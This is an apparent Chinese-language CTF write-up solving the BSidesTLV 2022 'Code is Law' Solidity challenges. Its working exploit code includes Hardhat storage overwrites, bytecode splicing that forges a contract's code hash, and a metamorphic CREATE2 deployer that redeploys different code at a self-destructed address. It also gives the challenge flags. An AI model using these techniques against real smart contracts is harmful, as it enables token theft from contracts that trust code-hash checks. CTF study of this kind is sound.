---
title: Blockchain - Code is Law
description: 2022 | BSidesTLV CTF | Blockchain
tags:
    - smart contract
    - hardhat
---

## 题目

Download the **zip** file and follow the instructions in the **README.md** file to solve the solidity challenge.

[:material-download: `code-is-law-1.zip`](static/code-is-law-1.zip)
[:material-download: `code-is-law-2.zip`](static/code-is-law-2.zip)

??? note "OnlyICanHazToken.sol"

    ```js
    // SPDX-License-Identifier: Unlicense
    pragma solidity ^0.8.0;

    contract OnlyICanHazToken {
        function bye() public {
            selfdestruct(payable(msg.sender));
        }
    }
    ```

??? note "index.ts"

    ```js
    import { expect } from "chai";
    import { ethers } from "hardhat";
    import { ChallengeToken } from "../typechain";

    // This "Challenge Setup" block must be left as-is
    describe("Challenge Setup", function () {
        it("Should deploy ChallengeToken", async function () {
            const ChallengeTokenFactory = await ethers.getContractFactory("ChallengeToken", (await ethers.getSigners()).pop());
            const challengeToken = await ChallengeTokenFactory.deploy();
            await challengeToken.deployed();
        });
    });

    // Try to solve the challenge below this line
    // Run `npx hardhat ctf-try` to test your solution locally
    // Run `npx hardhat ctf-try --submit` to submit your solution to the remote CTF node and get the real flag
    describe("Solve Challenge", function () {
        let challengeToken: ChallengeToken;

        it("Should return the winning flag", async function () {
            challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");

            const returnedFlag = await challengeToken.did_i_win()

            console.log(`\tThe returned flag is: "${returnedFlag}"`)
        });
    });
    ```

### Code is Law 1

??? note "ChallengeToken.sol"

    ```js
    // SPDX-License-Identifier: Unlicense
    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "hardhat/console.sol";

    contract ChallengeToken is ERC20 {
        bytes32 private onlyICanHazTokenContractCodeHash =
            0x1431A52467B8E0B496D710A30B897A6EB093CD9137FBF9B34B47441FD5E868F3;

        constructor() ERC20("ChallengeToken", "BSIDES2022") {}

        function did_i_win() public view returns (string memory) {
            if (balanceOf(msg.sender) == 0) {
                revert("you shall not pass");
            }

            return "BSidesTLV2022{PLACEHOLDER}";
        }

        function can_i_haz_token(address receiver) public {
            require(
                receiver == calculateAddressOfTheFirstContractDeployedBy(tx.origin),
                "receiver is ineligible for a token because they are not the first contract deployed by the EOA who initiated this transaction"
            );
            require(
                getContractCodeHash(receiver) == onlyICanHazTokenContractCodeHash,
                "receiver is ineligible for a token because their codehash does not match the specific contract codehash required"
            );

            if (balanceOf(receiver) == 0) {
                _mint(receiver, 1);
            }
        }

        function getContractCodeHash(address contractAddress)
            private
            view
            returns (bytes32 callerContractCodeHash)
        {
            assembly {
                callerContractCodeHash := extcodehash(contractAddress)
            }
        }

        // Copied from https://ethereum.stackexchange.com/a/87840
        function calculateAddressOfTheFirstContractDeployedBy(address deployer)
            private
            pure
            returns (address _address)
        {
            bytes32 hash = keccak256(
                abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))
            );

            assembly {
                mstore(0, hash)
                _address := mload(0)
            }
        }
    }
    ```

### Code is Law 2

??? note "ChallengeToken.sol"

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "hardhat/console.sol";

    contract ChallengeToken is ERC20 {
        bytes32 private onlyICanHazTokenContractCodeHash =
            0x1431A52467B8E0B496D710A30B897A6EB093CD9137FBF9B34B47441FD5E868F3;

        constructor() ERC20("ChallengeToken", "BSIDES2022") {}

        function did_i_win() public view returns (string memory) {
            if (balanceOf(msg.sender) == 0) {
                revert("you shall not pass");
            }

            return "BSidesTLV2022{PLACEHOLDER}";
        }

        function can_i_haz_token(address receiver) public {
            require(
                getContractCodeHash(receiver) == onlyICanHazTokenContractCodeHash,
                "receiver is ineligible for a token because their codehash does not match the specific contract codehash required"
            );

            if (balanceOf(receiver) == 0) {
                _mint(receiver, 1);
            }
        }

        function getContractCodeHash(address contractAddress)
            private
            view
            returns (bytes32 callerContractCodeHash)
        {
            assembly {
                callerContractCodeHash := extcodehash(contractAddress)
            }
        }

        function approve(address spender, uint256 amount) public override returns (bool) {
            return false;
        }
    }
    ```

## 解题思路 [English ver.](https://sekai.team/blog/bsidestlv-2022/code_is_law/)

- 当 `ChallengeToken.did_i_win()` 的 `msg.sender` 所在地址持有 `token` 时就能获得 flag
- 首先分析 `Code is Law 1` 的 `ChallengeToken` 合约
    - `ChallengeToken` 通过函数 `can_i_haz_token` 发放 `token`，但只有合约 `receiver` 在 `tx.origin` 初次部署合约的地址上，且合约代码的哈希值与 `onlyICanHazTokenContractCodeHash` 相等时才能获得
- 那么，先让合约 `OnlyICanHazToken` 获得 `token` 再转移呢？但 `selfdestruct(payable(msg.sender))` 只能转移以太币，无法转移 `token`
- 再回头看看 `ChallengeToken` 的 `getContractCodeHash` 和 `calculateAddressOfTheFirstContractDeployedBy` 似乎也没有什么问题，`ERC20` 就更不可能了 uwu
- 最后把注意力转移到了 `hardhat` 上，发现了能修改合约存储的 `hardhat_setStorageAt`[^1]（是神 (╥ω╥)），结合合约变量的存储位置、方式直接修改余额就好了！

    ```ts
    it("Should return the winning flag", async function () {
        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");
        
        let [player] = await ethers.getSigners();
        let playerHash = await ethers.utils.solidityKeccak256(["uint256", "uint"], [player.address, 0]);
        await ethers.provider.send("hardhat_setStorageAt", [challengeToken.address, playerHash, ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32)]);

        const returnedFlag = await challengeToken.did_i_win()
        console.log(`\tThe returned flag is: "${returnedFlag}"`)
    });
    ```

    - `ChallengeToken` 继承自 `ERC20`，变量 `_balances` 用于存储各个账户地址对应的余额
    - `_balances` 为 `mapping` 类型，占用 `slot 0`，那么地址 `A` 的余额存储位置在 `keccak256(A | 0)`，`|` 表示连接

- `Code is Law 2` 与 `Code is Law 1` 相比，只修改了 `ChallengeToken` 发放 `token` 的规则并禁用了 `approve`，因而修改存储的方法仍然适用 =）
- 看了官方 WP[^2][^3] 再来补充一下 =ω=

### Code is Law 1

- 关键点在于构造函数不是合约代码的一部分，因此可以在 `OnlyICanHazToken` 的构造函数中 `approve`
- 扩展合约 `OnlyICanHazToken`

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity ^0.8.0;

    import "./ChallengeToken.sol";

    contract ExtOnlyICanHazToken {
        constructor() {
            ChallengeToken(0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f).approve(msg.sender, 1);
        }

        function bye() public {
            selfdestruct(payable(msg.sender));
        }
    }
    ```

- 不过，直接使用合约 `ExtOnlyICanHazToken` 仍然会得到报错 `receiver is ineligible for a token because their codehash does not match the specific contract codehash required` :(
- 打印合约 `OnlyICanHazToken` 和 `ExtOnlyICanHazToken` 的字节码进行对比

    ```js
    console.log((await ethers.getContractFactory("OnlyICanHazToken")).bytecode);
    // 0x6080604052348015600f57600080fd5b5060848061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212208288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff64736f6c63430008040033
    console.log((await ethers.getContractFactory("ExtOnlyICanHazToken")).bytecode);
    // 0x608060405234801561001057600080fd5b507373511669fd4de447fed18bb79bafeac93ab7f31f73ffffffffffffffffffffffffffffffffffffffff1663095ea7b33360016040518363ffffffff1660e01b8152600401610061929190610115565b602060405180830381600087803b15801561007b57600080fd5b505af115801561008f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100b391906100ce565b506101af565b6000815190506100c881610198565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b6101008161013e565b82525050565b61010f81610186565b82525050565b600060408201905061012a60008301856100f7565b6101376020830184610106565b9392505050565b60006101498261015c565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101918261017c565b9050919050565b6101a181610150565b81146101ac57600080fd5b50565b6084806101bd6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb2964736f6c63430008040033
    ```

- 字节码 `39` 将合约代码拷贝到内存中，所以比较两份合约代码最后一个 `39` 后的字节码，发现有一小段差异

    ```
    6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_8288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff_64736f6c63430008040033
    6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb29_64736f6c63430008040033
    ```

- 编译器默认会将 `metadata` 文件的 IPFS 哈希添加到字节码的末尾[^4]，`v0.8.0` 版本的编译器通常按如下格式添加

    ```
    0xa2
    0x64 'ipfs'(69706673) 0x58 0x22 <34 bytes IPFS hash>
    0x64 'solc'(736f6c63) 0x43 <3 byte version encoding>
    0x00 0x33
    ```

- 为了通过 `extcodehash` 的检查，可以使用 `OnlyICanHazToken` 覆盖 `ExtOnlyICanHazToken` IPFS 哈希部分的字节码

    ```js
    it("Should return the winning flag", async function () {
        let onlyICanHazTokenFactory = await ethers.getContractFactory('OnlyICanHazToken');
        let extOnlyICanHazTokenFactory = await ethers.getContractFactory('ExtOnlyICanHazToken');

        let [player] = await ethers.getSigners();
        const ExtOnlyICanHazTokenFactory = new ethers.ContractFactory(onlyICanHazTokenFactory.interface, extOnlyICanHazTokenFactory.bytecode.substring(0, extOnlyICanHazTokenFactory.bytecode.length - 100) + onlyICanHazTokenFactory.bytecode.substring(onlyICanHazTokenFactory.bytecode.length - 100), player);
        let extOnlyICanHazToken = await ExtOnlyICanHazTokenFactory.deploy();
        await extOnlyICanHazToken.deployed();

        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");

        await challengeToken.can_i_haz_token(extOnlyICanHazToken.address);
        await challengeToken.transferFrom(extOnlyICanHazToken.address, player.address, 1);

        const returnedFlag = await challengeToken.did_i_win()

        console.log(`\tThe returned flag is: "${returnedFlag}"`)
    });
    ```

### Code is Law 2

- `approve` 被禁用了，但发放 `token` 的规则有所宽限，不再需要是 `tx.origin` 初次部署的合约
- 不过 Code is Law 1 中 `calculateAddressOfTheFirstContractDeployedBy` 依据的是 `CREATE` 操作码的地址计算规则，即新合约的地址与合约创建者的地址和由创建者发起的交易的数量有关。除此之外，合约还可以通过 `CREATE2` 操作码创建，此时的合约地址与合约创建者的地址、参数 `salt` 和合约创建代码有关，若保持合约创建代码不变，且构造函数返回的运行时字节码可控，就可以在同一地址上反复部署完全不同的合约
- 接下来思路就很清晰啦，先利用 `CREATE2` 部署 `OnlyICanHazToken` 并在取得 `token` 后 `selfdestruct`，再在相同地址上部署新的合约来转移 `token`
- 合约 `Deployer` 负责部署指定合约

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity ^0.8.0;

    contract Deployer {
        mapping (address => address) _implementations;
        address public deployAddr;

        // will be called by the metamorphic Contract
        function getImplementation() external view returns (address implementation) {
            return _implementations[msg.sender];
        }

        function _getMetamorphicContractAddress(uint256 salt, bytes memory metamorphicCode) internal view returns (address) {
            // determine the address of the metamorphic contract.
            return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff", address(this), salt, keccak256(abi.encodePacked(metamorphicCode)))))));
        }

        function deploy(bytes calldata bytecode, uint256 salt) public {
            bytes memory implInitCode = bytecode;

            // assign the initialization code for the metamorphic contract.
            bytes memory metamorphicCode  = (
                hex"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"
                // here 3c (extcodecopy) is used, not 39 (codecopy)
            );

            // declare a variable for the address of the implementation contract.
            address implementationContract;

            // load implementation init code and length, then deploy via CREATE.
            assembly {
                implementationContract := create(0, add(0x20, implInitCode), mload(implInitCode))
            }

            address metamorphicContractAddress = _getMetamorphicContractAddress(salt, metamorphicCode);
            // first we deploy the code we want to deploy on a separate address
            // store the implementation to be retrieved by the metamorphic contract.
            _implementations[metamorphicContractAddress] = implementationContract;

            address addr;
            assembly {  
                addr := create2(
                    0,  // send 0 wei
                    add(0x20, metamorphicCode), // load initialization code.
                    mload(metamorphicCode), // load init code's length.
                    salt
                )
            }

            deployAddr = addr;
        }
    }
    ```

- 合约 `Withdrawer` 用于转移 `token`，在 `OnlyICanHazToken` 实例自毁后由 `Deployer` 部署到原 `OnlyICanHazToken` 实例所在的地址

    ```js
    //SPDX-License-Identifier: Unlicense
    pragma solidity ^0.8.0;

    import "./ChallengeToken.sol";

    contract Withdrawer {
        function withdraw() public {
            ChallengeToken(0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f).transfer(msg.sender, 1);
        }
    }
    ```

- 合约交互过程

    ```js
    it("Should return the winning flag", async function () {
        challengeToken = await ethers.getContractAt("ChallengeToken", "0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f");

        let salt = 1;

        let deployerFactory = await ethers.getContractFactory("Deployer");
        let deployer = await deployerFactory.deploy();
        await deployer.deployed();

        let onlyICanHazTokenFactory = await ethers.getContractFactory('OnlyICanHazToken');
        await deployer.deploy(onlyICanHazTokenFactory.bytecode, salt);
        let deployAddr = await deployer.deployAddr();
        challengeToken.can_i_haz_token(deployAddr);

        let onlyICanHazToken = await ethers.getContractAt("OnlyICanHazToken", deployAddr);
        await onlyICanHazToken.bye();

        let withdrawerFactory = await ethers.getContractFactory('Withdrawer');
        await deployer.deploy(withdrawerFactory.bytecode, salt);
        let withdrawer = await ethers.getContractAt("Withdrawer", deployAddr);
        await withdrawer.withdraw();

        const returnedFlag = await challengeToken.did_i_win();

        console.log(`\tThe returned flag is: "${returnedFlag}"`)
    });
    ```

### Flag

#### Code is Law 1

> BSidesTLV2022{c0nstUct!v3_m@g!3_ind3ed}

#### Code is Law 2

> BSidesTLV2022{W!L3_M@g!3_in_the_w3rld}

## 参考资料

- [ContractFactory | ethers](https://docs.ethers.io/v5/single-page/#/v5/api/contract/contract-factory/)
- [EVM Dialect](https://docs.soliditylang.org/en/latest/yul.html?highlight=create2#evm-dialect)
- [Overwriting Smart Contracts](https://ethereum-blockchain-developer.com/110-upgrade-smart-contracts/12-metamorphosis-create2/#overwriting-smart-contracts)

[^1]: [Local ERC20 Balance Manipulation (with HardHat)](https://kndrck.co/posts/local_erc20_bal_mani_w_hh/)

[^2]: [Code is Law 1: Solidity CTF Challenge Writeup | by Oren Yomtov](https://medium.com/@patternrecognizer/solidity-ctf-writeup-code-is-law-1-465428bf4bd5)

[^3]: [Code is Law 2: Solidity CTF Challenge Writeup | by Oren Yomtov](https://medium.com/@patternrecognizer/code-is-law-2-solidity-ctf-challenge-writeup-c55f072664a9)

[^4]: [Contract Metadata](https://docs.soliditylang.org/en/v0.8.15/metadata.html)